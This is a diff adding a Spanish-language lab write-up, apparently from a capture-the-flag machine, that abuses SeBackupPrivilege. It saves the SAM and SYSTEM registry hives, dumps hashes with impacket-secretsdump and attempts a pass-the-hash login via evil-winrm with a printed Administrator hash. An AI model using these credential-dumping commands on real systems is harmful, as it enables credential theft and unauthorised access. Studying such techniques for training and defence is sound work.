@@ -57,8 +57,50 @@ Encontramos los privilegios de `SeBackupPrivilege`
 Este privilegio nos deja leer cualquier archivo del sistema sin importar los permisos de la ACL. Pudiendo llegar a realizar una explotación de `Credentiasl Dumping`
 
 ## Credential Dumping
+En esta explotación extraemos la `SAM` y `SYSTEM` para desde fuera con [[IMPACKET]] poder interceptar los hashes que había en la maquina y poder elevar nuestros privilegios
 
+- Primero deberemos crear un directorio `/temp` 
+	```shell
+	mkdir C:\temp
+	```
+
+- Segundo se copia la `sam` al directorio `/temp` que hemos creado y copiamos también el de  `system` guardándolo en nuestro `/temp`
+```shell
+reg save hklm\sam C:\temp\sam.hive
+```
+
+```shell
+reg save hklm\system C:\temp\system.hive
+```
+
+- Tercero pasamos el archivo `sam` y `system`  a nuestra maquina atacante con 
+```shell
+download sam.hive
+```
+
+ ```shell
+ download system.hive
+ ```
+
+ Usaremos [[IMPACKET]] pasándole las opciones de 
+ - `-sam` para pasarle la `SAM` descargada
+ - `-system` para pasarle el `SYSTEM` descargado
+ - `LOCAL` para obtener los hashes de forma offline
+  ```shell
+
+  impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+  ```
+
+Obteniendo así el hash del usuario administrador 
 
 ```ad-hint
 Administrator::34386a771aaca697f447754e4863d38a
 ```
+
+Probaremos a conectarnos con el a través de [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.129.95.241 -u Administrator -H 34386a771aaca697f447754e4863d38a
+```
+
+Pero en este caso nos esta rechazando la conexión así que la escalada de privilegios lleva otro camino
+
